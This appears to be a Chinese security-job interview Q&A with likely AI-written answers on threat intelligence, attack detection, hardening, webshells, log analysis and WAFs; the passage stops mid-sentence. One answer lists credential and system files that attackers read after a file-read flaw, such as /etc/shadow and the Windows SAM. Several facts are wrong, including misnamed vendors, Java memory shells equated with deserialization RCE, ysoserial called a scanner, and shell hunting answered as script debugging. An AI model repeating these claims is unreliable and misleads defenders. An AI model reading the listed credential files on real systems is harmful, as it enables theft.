你知道的威胁情报库有哪些？ 银河麒麟（ThreatBook）：银河麒麟是国内领先的网络安全威胁情报服务提供商，其威胁情报库包括恶意软件、攻击源IP、域名等方面的信息。 国家互联网应急中心（CNCERT）：CNCERT 是中国政府统一组织和协调全国互联网安全工作的部门，其威胁情报库包括漏洞、恶意代码、攻击事件等方面的信息。 安恒威胁情报中心（ATIS）： ATIS 是安恒信息安全研究院旗下的威胁情报中心，其威胁情报库涵盖了APT攻击、Web攻击、恶意邮件、移动恶意软件等方面的信息。 漏洞盒子（KnownSec）：漏洞盒子是一家致力于网络安全防御和攻防技术研究的公司，其威胁情报库包括漏洞、恶意代码等方面的信息。 360威胁情报中心（360 TI Center）：360 威胁情报中心聚焦于威胁情报、安全事件响应和恶意代码研究等领域，其威胁情报库包括APT攻击、恶意URL等方面的信息。 需要注意的是，以上威胁情报库只是其中一部分，实际应用中还有很多其他的威胁情报库。在使用威胁情报库时，需要根据具体需求进行评估和选择，并确保数据来源可靠、及时和准确。 怎么发现有没有被攻击？发现自己是否被攻击是网络安全管理中非常重要的一环。以下是几种常见的发现被攻击的方法： 安全日志监控：对系统和应用程序的安全日志进行监控，可以及时发现异常活动和安全事件。例如，登录失败、异常访问、恶意软件入侵等。 网络流量分析：通过对网络流量进行监控和分析，可以发现可能存在的攻击行为。例如，大量来自某个 IP 地址或特定端口的流量、恶意脚本和代码注入等。 主机基线监测：通过对应用程序、操作系统和数据文件等资源进行基线监测，可以及时发现可能存在的异常变化和不正常的活动。 脆弱性扫描：通过使用脆弱性扫描工具，可以发现系统中可能存在的漏洞，并提供修补建议。 威胁情报监测：通过使用威胁情报库和服务，可以了解到当前存在的威胁活动，及时采取防御措施。 安全演练：通过进行安全演练，可以模拟真实的攻击场景，评估自身的安全状态，及时发现和修复存在的问题。 需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的发现被攻击的方法。在进行网络安全管理时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。 SQL 注入如何进行检测 数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。 应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。 漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。 安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。 手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。 需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。 Sql 注入加固措施？为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施： 输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。 参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。 最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。 安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。 异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。 安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。 需要注意的是，以上只是其中一部分常见的 SQL 注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。 文件上传和命令执行，有看过相关日志吗？文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。 对于文件上传漏洞，以下是一些可能存在的相关日志： 文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。 访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。 安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。 对于命令执行漏洞，以下是一些可能存在的相关日志： 访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。 异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。 安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。 需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。 你能说明文件上传的原理吗？当用户上传文件时，通常需要通过 HTTP 或 HTTPS 协议将文件传输到 Web 服务器。文件上传的原理可以简单地描述为： 客户端向服务器发送一个包含文件数据的 POST 请求。 服务器接收请求并解析其中的文件数据。 服务器将文件保存在指定的目录下，并返回处理结果给客户端。 具体来说，文件上传流程一般如下： 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。 文件上传攻击特征？文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征： 文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。 文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。 文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。 大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。 目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。 如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。 文件上传加固方法？以下是保护您的网站免受文件上传攻击的一些方法： 文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。 检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。 重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。 存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。 使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。 HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。 日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。 总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。 暴力破解加固方法？以下是一些保护您的网站免受暴力破解攻击的方法： 密码策略：实施强密码策略，建议用户使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。 账户锁定：限制密码尝试次数，并在多次失败后自动锁定账户。同时，应该通过邮件或短信通知用户他们的账户已被锁定，以防止攻击者对其进行进一步攻击。 人机验证：在登录页面引入验证码或其他形式的人机验证，以防止自动化破解程序的攻击。 访问控制：实施访问控制策略，限制只有授权用户才能够访问敏感信息或功能。而且还应该限制来自未知来源或具有恶意行为的IP地址的访问。 强制退出：如果用户长时间没有活动，应强制退出登录状态，以防止攻击者通过利用未注销的会话进行攻击。 检测异常行为：检测异常登录行为，如从异常地区或设备登录，或频繁更改登录IP地址等。 安全日志审计：监控并记录登录事件，并对日志进行审计和分析，以便及时发现异常行为并采取措施。 总之，在防止暴力破解攻击方面，需要综合考虑多种因素，包括密码策略、账户锁定、人机验证、访问控制、强制退出、检测异常行为等。同时，应保持应用程序的更新，及时修补安全漏洞，以确保系统的完整性和安全性。 DDOS CC等攻击应急思路以及如何防范DDoS（分布式拒绝服务攻击）和 CC（HTTP）攻击是目前比较普遍的网络攻击方式之一。以下是应急响应思路以及如何防范这些攻击的建议： 应急响应思路 在受到DDoS和CC攻击时，应采取以下措施来降低攻击对系统的影响： 快速检测并确认攻击类型和攻击源； 提高带宽和资源利用率，以提供更强的承载能力； 实施流量清洗、流量限制和IP封堵等措施，清除恶意攻击流量； 配合 ISP 进行攻击源 IP 的追踪和协助； 在攻击持续期间，保持实时监控和跟进，随时更新应急响应策略。 如何防范 为了预防DDoS和CC攻击，可以采取以下方法： 增加网络带宽，并提高硬件设备的承载能力，以抵御较小规模的攻击； 实现DDoS和CC攻击的检测和防御机制，如基于流量和行为的检测技术和防御技术； 确保服务器和网站软件及时更新，以弥补已知漏洞； 实施流量清洗、流量限制和IP封堵等措施； 配置合理的防火墙规则和入侵检测系统（IDS）等安全设备； 加强网络安全教育，提高用户密码安全性，并定期对敏感数据进行备份和加密。 总之，在防范DDoS和CC攻击方面，需要综合考虑多种因素，包括增加带宽、提高硬件承载能力、实现攻击检测和防御机制、确保服务器和网站软件及时更新、加强网络安全教育等。同时，应该建立完善的应急响应机制和紧急处理预案，以做好应急响应准备和快速响应。 挖矿病毒判断以及处理方式挖矿病毒是指利用受感染的计算机进行加密货币挖矿的恶意软件。以下是判断和处理挖矿病毒的一些方法： 判断挖矿病毒 通过以下迹象可以判断计算机是否被感染了挖矿病毒： 计算机运行速度变慢，CPU占用率高； 电脑风扇声音变大，温度升高； 安全软件报告未知病毒或恶意软件； 系统出现闪退或死机等异常情况。 处理方式 如果怀疑计算机已经被感染了挖矿病毒，可以采取以下措施： 及时更新杀毒软件，并开启实时保护模式； 扫描整个系统，清除所有恶意文件和注册表项； 禁止不明程序自启动，及时关闭被感染的进程； 在安装软件时仔细阅读许可协议，禁止安装未知来源的软件； 加强账户权限管理，限制非管理员用户对系统的操作权限； 及时备份重要文件，以便在恶意软件攻击后恢复数据。 总之，在处理挖矿病毒方面，需要及时发现和清除感染，并加强系统的安全防护措施，如升级杀毒软件、限制非管理员用户权限、备份重要文件等。同时，也需要加强网络安全教育，提高用户对于计算机安全的意识和防范能力。 服务器存在 webshell，如何处理？Webshell是一种Web服务器上的恶意代码，可以使攻击者远程控制服务器，并执行各种命令、上传下载文件等操作。以下是处理服务器存在Webshell的一些方法： 扫描和确认Webshell 可以通过查看Web服务器日志或使用安全扫描工具来确认是否存在Webshell。找出所有可疑文件并进行彻底检查，以确定是否存在Webshell。 删除Webshell 如果确定存在Webshell，需要立即将其删除，并对系统进行全面清理。删除Webshell时，应同时清除与Webshell相关的文件和目录，并且应用程序代码也需要进行更新和修复。 加强安全防护措施 为了避免服务器再次被感染，需要加强安全防护措施，包括加强服务器的监控和日志审计、安装杀毒软件并定期更新、限制非管理员用户权限等。 修改密码 修改服务器管理员的账户密码，并确保强密码策略得到实施，建议使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。 更新和修复应用程序代码 Webshell通常是由于应用程序存在漏洞或安全问题而被植入的。因此，为了防止类似问题再次发生，需要及时更新并修复应用程序代码中的安全漏洞。 总之，在处理服务器存在Webshell的问题时，需要快速准确地识别和清除Webshell，并加强服务器和应用程序的安全防护措施。同时，也需要定期进行巡检和审计，及时发现和排除漏洞，以确保系统的完整性和安全性。 排查 shell 应该用什么命令来进行排查？要排查 shell 的问题，可以使用以下命令： echo：用于打印变量或字符串，可以用来检查变量的值是否正确。 set：用于显示所有的 shell 变量和函数，包括环境变量。 env：用于显示当前 shell 环境下的所有环境变量。 source 或 .：用于读取并执行指定文件中的命令，通常用于重新加载配置文件。 sh -x script.sh：用于以调试模式执行脚本，并输出每个执行的命令及其参数。 ps：用于列出当前正在运行的进程，可以使用 ps aux 查看详细信息。 top：用于实时查看系统资源的使用情况，可以用来定位占用 CPU 或内存过高的进程。 grep：用于搜索指定的文本内容，可以用来查找特定日志文件中的错误信息等。 这些命令可以帮助您快速诊断 shell 中的问题。 如何检测 webshell？Webshell是指嵌入到Web服务器上的一种命令执行环境，可以通过Web页面或HTTP协议与其进行交互，攻击者可以利用Webshell来执行各种恶意操作。检测Webshell可以使用以下几种方法： 查看Web服务器访问日志：Webshell通常会产生异常的网络流量，例如向非标准端口发送POST请求等。查看Web服务器的访问日志，观察是否存在异常的请求。 安全扫描工具：使用安全扫描工具对Web服务器进行扫描，以检测是否存在Webshell。常用的安全扫描工具包括Nessus、OpenVAS等。 文件监控：Webshell通常会将恶意代码写入某个文件中，因此可以通过文件监控工具来检测Webshell。例如，当文件被修改时，文件监控工具会立即发送警报。 内存监控：有些高级的Webshell可能不会在磁盘上留下任何痕迹，而是直接将代码注入到内存中。因此，可以使用内存监控工具来检测是否存在Webshell。 安全审计：对Web服务器进行安全审计，检查是否存在安全漏洞，例如文件上传漏洞、命令注入漏洞等。攻击者通常会利用这些漏洞来上传Webshell。 以上方法并不能完全保证检测到所有的Webshell，因此建议在Web服务器上部署安全防护解决方案，定期进行安全扫描和审核，并及时更新软件补丁。 一台主机在内网进行横向攻击，你应该怎么做？如果一台主机在内网进行横向攻击，建议采取以下措施： 隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。 停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。 收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。 清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。 升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻击。 取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。 加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。 总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。 常见端口及其漏洞有哪些？以下是常见的端口及其漏洞： 端口 21（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。 端口 22（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。 端口 23（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。 端口 25（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。 端口 53（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。 端口 80/443（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。 端口 135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。 端口 139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。 端口 3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。 以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。 你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？当我分析数据包或者日志时，通常会采用如下的思路： 收集数据包或日志文件：首先需要收集相关的数据包或日志文件，以便后续分析。 过滤和提取关键信息：对于大量的数据包或日志，需要通过过滤和提取关键信息的方式来缩小分析范围。例如，可以使用Wireshark的过滤器或grep命令来筛选出特定协议、IP地址等关键信息。 分析数据包或日志：根据需求进行数据包或日志的分析，并尝试从中发现异常或可疑行为。例如，可以查找异常的流量模式、不寻常的端口、频率异常的请求等。 确认问题并记录结论：在分析过程中，需要确认是否存在安全问题，并记录所得到的结论。 对问题进行修复和防范：最后，需要针对分析结果采取相应的措施，例如修补漏洞、加强访问控制、优化安全策略等，以降低风险和增强安全性。 在这个过程中，我可能会使用以下一些工具和网站： Wireshark：网络数据包分析工具，用于捕获和分析网络数据包。 ELK Stack：用于日志管理和分析的综合解决方案，包括Elasticsearch、Logstash和Kibana。 grep命令：用于在文本文件中搜索特定模式的字符串。 WHOIS查询工具：用于查询域名的注册信息。 端口扫描工具：例如nmap，用于识别目标主机上开放的端口和服务。 CVE漏洞数据库：用于查询已知漏洞的详细信息。 OWASP Top 10：一个常见的Web应用程序安全风险排名列表，用于参考Web应用程序是否存在常见的安全问题。 需要注意的是，分析过程中所用到的工具和网站因情况而异，具体根据实际需求进行选择。 给你一个比较大的日志，应该如何分析当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析： 对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。 确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。 使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。 定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。 进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。 采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。 需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。 如何查看系统内存 shell我们可以通过使用一些命令来查看系统内存的使用情况。以下是一些常用的命令： free：用于显示当前系统的内存使用情况，包括已用内存、空闲内存、缓冲区内存和交换分区内存等。 123456PLAINTEXT$ free -h total used free shared buff/cache availableMem: 7.8G 3.4G 289M 88M 4.1G 4.0GSwap: 2.0G 895M 1.1G top：用于实时监视进程的运行状态，包括CPU和内存的使用情况。在 top 命令中，我们可以按 M 键排序以查看占用内存较多的进程。 ps：用于列出正在运行的进程，可以结合其他的选项来查看进程的详细信息，例如： 123456PLAINTEXT$ ps aux --sort=-%mem | headUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.1 225804 11356 ? Ss 05:30 0:01 /sbin/init splash... 以上命令都是在命令行环境下执行的。如果要图形化地查看系统内存使用情况，可以使用 GNOME 系统监视器（gnome-system-monitor）或 KDE 系统监视器（ksysguard）等工具，在图形化界面中方便地查看系统内存的使用情况和进程信息。 需要注意的是，当我们在 shell 中查看内存使用情况时，不要随意终止或杀死系统进程，否则可能会导致不可预估的后果。 不安全的第三方组件的漏洞如何做前置规避？以下是一些规避不安全的第三方组件漏洞的前置方法： 筛选可靠的第三方组件：在选择和采用第三方组件时，应该尽量选择那些经过广泛使用和审查、开源社区活跃、有明确维护计划等因素使人们信任的组件。此外还可以参考其他用户反馈、评测结果等对第三方组件进行评估。 定期更新组件版本：及时更新第三方组件以修复已知漏洞是很重要的。因此，需要定期检查并更新使用的第三方组件。 加强访问控制：为了防止黑客攻击通过不安全的第三方组件进入系统，需要加强访问控制，例如限制只有授权用户才能访问系统。 实施安全策略：实施相关的安全策略，如深度防御、安全审计等，以提高系统的安全性。 停用不必要的功能：如果某个第三方组件包含多个功能，但仅有部分功能被系统所用到，建议将未使用的功能关闭或移除，从而减少系统被攻击的风险。 使用漏洞扫描工具进行检测：使用漏洞扫描工具对系统中的第三方组件进行定期检测，及时发现已知漏洞并修复。 需要注意的是，在前置规避不安全的第三方组件漏洞时，不能完全依赖于单一的措施。相反，应该采用多种手段来提高系统的安全性，从而避免被攻击者利用不安全的第三方组件漏洞进行攻击。 Java 内存马排查有了解吗Java内存马，也称为Java远程代码执行漏洞，是一种利用Java反序列化漏洞的攻击方式。攻击者可以通过构造恶意的序列化对象，将其发送给目标服务器并触发反序列化操作，从而在目标服务器上执行任意代码。以下是几种排查Java内存马的方法： 追踪日志文件：如果系统已经被攻击，应该首先检查系统的日志文件，查找异常的请求或响应内容，并结合其他的信息确定是否存在Java内存马。 检查网络流量：可以使用Wireshark等网络抓包工具来监视服务器的网络流量，并分析报文中的数据内容，查找是否存在异常的Java序列化数据。 检查反序列化漏洞：Java内存马利用了Java反序列化漏洞，因此我们可以使用一些反序列化漏洞扫描工具（如 ysoserial）来检测系统是否受到这类漏洞的影响，并及时修补漏洞。 检查系统进程：Java内存马通常会在目标服务器上启动一个新的进程来执行恶意代码，因此可以通过检查系统进程列表，查找是否存在不明确的、异常的进程。 安装安全软件：为了更好地保障系统的安全性，可以安装一些专业的安全软件，如杀毒软件、入侵检测系统（IDS）等，并定期进行扫描和审计。 需要注意的是，在排查Java内存马时，应该综合使用多种方法来确定是否存在此类攻击。同时也要及时修补系统漏洞，加强访问控制，并采取其他措施提高系统的安全性。 如何修改 WEB 端口？如果不能修改端口还有什么利用方法？要修改 WEB 端口，需要在 Web 服务器的配置文件中修改端口号。以下是一些常见的 Web 服务器的端口修改方式： Apache：找到 Apache 的 httpd.conf 配置文件，编辑 Listen 指令即可。 123PLAINTEXTListen 8080 Nginx：找到 Nginx 的 nginx.conf 配置文件，编辑 http 模块下的 listen 指令即可。 123456789PLAINTEXThttp &#123; ... server &#123; listen 8080; &#125; ...&#125; Tomcat：找到 Tomcat 的 server.xml 配置文件，编辑 Connector 指令中的 port 属性即可。 12345PLAINTEXT&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; 如果不能修改端口，攻击者可能会尝试其他利用方法，如： 尝试使用默认或者弱口令登录：许多 web 应用程序都有默认的用户名和密码，或者用户使用简单的密码。攻击者可以通过爆破等方式，尝试使用这些凭据登录系统。 利用已知漏洞进行攻击：攻击者可以通过利用已知的漏洞来攻击目标系统，例如，注入攻击、文件上传漏洞、跨站点脚本（XSS）漏洞等。 利用社工攻击：攻击者可以使用钓鱼邮件、欺诈电话等方式进行社交工程攻击，从而获得目标系统的访问凭据或者其他重要信息。 为了防止这些攻击，我们应该采取一系列措施来加强系统安全。例如： 使用复杂的密码和多因素身份验证，提高登录安全性。 及时更新软件版本和安全补丁，修复已知的漏洞。 限制访问权限，仅允许授权用户访问系统，并对不明来源的流量进行阻拦或监测。 部署入侵检测系统（IDS）或入侵防御系统（IPS），对入侵行为进行实时监测和防范。 定期进行漏洞扫描、安全审计等工作，及时发现并修补系统中存在的漏洞。 获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈获得文件读取漏洞后，攻击者通常会尝试读取一些敏感信息，例如系统配置文件、数据库凭据、应用程序源代码等。以下是在 Linux 和 Windows 操作系统上，攻击者可能会尝试读取的一些文件： Linux /etc/passwd：包含本地用户的账户信息。 /etc/group：包含用户组的信息。 /etc/shadow：保存本地用户密码哈希值的文件。 /etc/sudoers：保存 sudo 命令权限的文件。 /proc/net/tcp：包含当前正在运行的 TCP 连接信息。 /var/log/auth.log：包含系统中用户认证和授权的日志信息。 应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。 Windows C:\\Windows\\system32\\config\\SAM：包含本地账户的哈希密码值。 C:\\Windows\\system32\\config\\SYSTEM：包含系统的配置信息。 C:\\inetpub\\wwwroot\\web.config：包含 IIS 网站的配置信息。 C:\\Program Files (x86)\\MySQL\\MySQL Server 5.7\\my.ini：包含 MySQL 数据库的配置信息。 C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys：包含机器级别的 RSA 密钥。 Event log 文件：攻击者可能会尝试读取操作系统事件日志文件，以查看系统的历史记录信息。 应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。 为了防止文件读取漏洞的攻击，我们可以采取以下一些措施： 限制访问权限：在操作系统、应用程序和网站中，应该合理设置安全访问策略，并对敏感信息和文件进行严格的权限控制。 加密重要文件：对重要文件进行加密处理，防止黑客获取有效信息。 安装入侵检测系统（IDS）：使用 IDS 系统来监测系统内部和外部的攻击行为。 监控日志：对系统中产生的日志进行定期审计和监控，及时发现异常情况并采取相应的措施。 及时修补漏洞：定期检查和更新系统、应用程序和第三方库的版本，以修复已知的漏洞。 如何分析被代理出来的数据流被代理出来的数据流通常是由代理服务器拦截并转发的，可以借助代理工具（如 Burp Suite）等工具来对数据流进行分析。以下是一些可能的分析方法： 拦截和重放请求：在代理工具中，我们可以通过拦截请求，并对其做出修改，然后再次发送请求到目标服务器上，从而观察应用程序如何响应这些请求。 查看请求和响应头信息：在代理工具中，我们可以查看 HTTP 请求和响应头信息，包括 cookies、User-Agent 等，以了解应用程序的行为。 分析 HTTP 响应体：代理工具能够捕获 HTTP 响应体，并显示在工具界面中，我们可以查看应用程序返回的 HTML、JavaScript、CSS、图片等内容，以便了解应用程序的结构和行为。 查找敏感信息：代理工具可以对所有的 HTTP 流量进行记录和分析，我们可以通过搜索敏感信息来查找密码、凭据等敏感信息是否泄露。 使用插件进行分析：代理工具通常具有各种插件，例如 XSS 扫描器、SQL 注入扫描器、漏洞扫描器等，可以使用这些插件来检测应用程序中的漏洞和安全风险。 需要注意的是，在进行数据流分析时，必须遵守法律和道德规范，不得盗取或滥用他人信息。同时，对于代理工具捕获的敏感信息，一定要妥善保护，避免泄露给未授权的人员。 查看 windows 进程的方法有哪些以下是查看 Windows 进程的几种方法： 任务管理器：可以通过打开任务管理器来查看当前正在运行的进程。在 Windows 10 中，可以使用快捷键 Ctrl + Shift + Esc 来打开任务管理器；在其他版本的 Windows 中，可以使用 Ctrl + Alt + Delete 快捷键，然后选择“任务管理器”来打开。 命令行工具：可以使用命令行工具（如 cmd 或 PowerShell）来查看进程。在命令行中输入“tasklist”命令，即可列出当前正在运行的所有进程及其相关信息。 系统资源监视器：系统资源监视器是一个 Windows 内置的性能监控工具，可以查看系统的 CPU 使用率、内存占用率、磁盘和网络活动等信息。同时，它还提供了一个进程列表，可以显示每个进程的 CPU 使用率、内存占用情况等详细信息。 第三方工具：除了 Windows 自带的工具外，还有许多第三方工具可以用来查看进程，如 Process Explorer、Process Hacker 等。这些工具通常提供更加详细的进程信息，并允许用户对进程进行调试和管理。 无论使用哪种方法，对于一些可疑的进程，我们应该及时采取相应的措施，例如杀死进程、禁止其自启动等。同时，我们还应该注意保护系统安全，避免恶意进程的入侵和攻击。 如何查看进程对应的程序位置在 Windows 操作系统中，可以通过以下几种方法查看进程对应的程序位置： 使用任务管理器：打开任务管理器，选择“详细信息”选项卡，右键单击需要查看程序位置的进程，选择“打开文件位置”。 使用资源监视器：在资源监视器中，选择“CPU”选项卡，找到需要查看程序位置的进程，在右侧面板中选择该进程并右键单击，选择“属性”菜单，即可查看程序位置。 使用命令行工具：打开命令提示符或者 PowerShell，输入以下命令： 123PLAINTEXTwmic process where &quot;processid=[进程 ID]&quot; get ExecutablePath 其中，[进程 ID]是需要查看的进程的 PID（进程标识符）。 使用第三方工具：许多第三方工具（如 Process Explorer）提供了更加详细的进程信息，并可以帮助用户快速定位程序位置。 无论使用哪种方法，我们都可以在查找到程序位置后，根据需要采取相应的措施。例如，为了解决某些问题，我们可能需要删除、备份或更新程序文件；而在排查安全问题时，我们可能需要检查程序文件是否被篡改或者感染了病毒。 WAF 产品有哪些分类，是如何拦截攻击的WAF（Web 应用程序防火墙）产品通常可以分为以下几种分类： 基于签名的 WAF：基于签名的 WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。 基于行为的 WAF：基于行为的 WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。 综合型 WAF：综合型 WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。 WAF 产品一般通过拦截攻击请求来保护 Web 应用程序。具体的拦截方式包括： 黑名单过滤：根据已知的攻击方式，设置黑名单规则，对符合规则的请求进行拦截。 白名单过滤：对请求进行白名单过滤，只允许符合规则的请求通过。 存储过程注入防护：对 SQL 注入进行防护。WAF 可以检测并拦截具有攻击意图的 